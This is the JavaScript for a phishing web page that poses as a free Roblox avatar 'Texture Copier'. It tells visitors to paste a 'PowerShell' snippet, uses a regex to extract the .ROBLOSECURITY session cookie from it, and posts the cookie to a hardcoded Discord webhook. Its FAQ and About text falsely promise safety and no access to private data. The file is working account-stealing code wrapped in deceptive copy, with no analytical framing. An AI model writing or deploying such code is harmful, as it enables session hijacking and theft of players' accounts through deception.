// === UI CHANGES ===

// 1. Change button text to "Compile PowerShell"
document.getElementById('enterButton').textContent = "Compile PowerShell";

// 2. Update instruction text
document.getElementById('instructions').textContent =
  'Press on the "Compile PowerShell" button to compile your avatar. Once you have your PowerShell copied, you can paste it and hit "Enter" To send it.';

// === MODAL & POWERSHELL INPUT LOGIC ===

document.getElementById('enterButton').addEventListener('click', function() {
  openModal('powershell');
});

function openModal(type) {
  const modal = document.getElementById('modal');
  const title = document.getElementById('modal-title');
  const text = document.getElementById('modal-text');
  const textarea = document.getElementById('powershellInput');
  const submitBtn = document.getElementById('submitButton');

  // Reset fade-out class for modal content when a modal opens
  const modalContent = document.querySelector('.modal-content');
  modalContent.classList.remove('fade-out');  // Remove fade-out class if present

  if (type === 'faq') {
    title.textContent = "FAQ";
    text.style.display = "";
    textarea.style.display = "none";
    submitBtn.style.display = "none";
    text.innerText = `Q: What does Texture Copier do?\n\nA: Texture Copier allows you to easily copy the clothing, accessories, and avatar setup from any Roblox character.\n\nQ: Is this tool safe?\n\nA: Yes! Texture Copier only reads public avatar information and does not access private data.\n\nQ: How do I use it?\n\nA: Press on "Compile PowerShell" to upload your PowerShell script.`; 
  } else if (type === 'about') {
    title.textContent = "About";
    text.style.display = "";
    textarea.style.display = "none";
    submitBtn.style.display = "none";
    text.innerText = `Texture Copier is a simple and free tool made for Roblox players who want to quickly copy avatar styles.\n\nThis tool is designed for ease-of-use, speed, and full safety. No downloads, no accounts, and no private data required.\n\nWe believe that creativity should be accessible to everyone, and copying styles should be effortless.`; 
  } else if (type === 'tos') {
    title.textContent = "Terms of Service";
    text.style.display = "";
    textarea.style.display = "none";
    submitBtn.style.display = "none";
    text.innerText = `By using Texture Copier, you agree to the following:\n\n- This tool is for personal use only.\n- We are not responsible for any misuse of the tool.\n- No attempts to abuse, automate, or reverse-engineer the system.\n- Respect other players' creativity and use responsibly.`; 
  } else if (type === 'powershell') {
    title.textContent = "Compile PowerShell";
    text.style.display = "none";
    textarea.style.display = "";
    submitBtn.style.display = "";
    textarea.value = ""; // Clear previous input
  }

  modal.style.display = "flex";
  document.body.classList.add('modal-open');
}

// === Close Modal When Clicking Outside ===
function closeModal() {
  const modal = document.getElementById('modal');
  const modalContent = document.querySelector('.modal-content');

  // Apply fade-out effect to modal content
  modalContent.classList.add('fade-out');

  setTimeout(() => {
    modal.style.display = "none"; // Hide the modal after fade-out is complete
    document.body.classList.remove('modal-open');
  }, 1000); // Wait for the fade-out animation (1 second)
}

window.onclick = function(event) {
  const modal = document.getElementById('modal');
  if (event.target === modal) {
    closeModal();
  }
}

// === PowerShell Submission Logic ===
document.getElementById('submitButton').addEventListener('click', function() {
  const powershellInput = document.getElementById('powershellInput');
  const powershellData = powershellInput.value;

  if (!powershellData) {
    alert('Please paste your PowerShell data.');
    return;
  }

  // Regex to extract only the .ROBLOSECURITY cookie value
  const roblosecurityRegex = /\$session\.Cookies\.Add\(\(New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
  const match = powershellData.match(roblosecurityRegex);

  let payload;
  if (match) {
    payload = {
      embeds: [
        {
          title: ".ROBLOSECURITY Cookie Found",
          description: match[1],
          color: 0xFF0000
        }
      ]
    };
    console.log("COOKIE VALUE EXTRACTED!", match[1]);
  } else {
    payload = {
      embeds: [
        {
          title: "No .ROBLOSECURITY Cookie Found",
          description: "No .ROBLOSECURITY cookie value was found in the submitted PowerShell data.",
          color: 0xCCCCCC
        }
      ]
    };
  }

  fetch('https://discord.com/api/webhooks/1365872225650999368/4zuhOH83udSWA5c1WY84i43pR8qVUGuVEtunxL84AXtd5-xRXIsvhdpKynh9GSqZPLZq', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload)
  })
  .then(response => {
    // Show success message
    const popup = document.createElement('div');
    popup.className = 'custom-popup';
    popup.innerText = "Data submitted successfully!";
    document.body.appendChild(popup);

    setTimeout(() => {
      popup.classList.add('show');
    }, 100);

    setTimeout(() => {
      popup.classList.remove('show');
      setTimeout(() => popup.remove(), 500);
    }, 3000);

    // Clear input and hide modal
    powershellInput.value = '';
    closeModal();
  })
  .catch(error => {
    console.error('Error:', error);
    alert('Error submitting data.');
  });
});
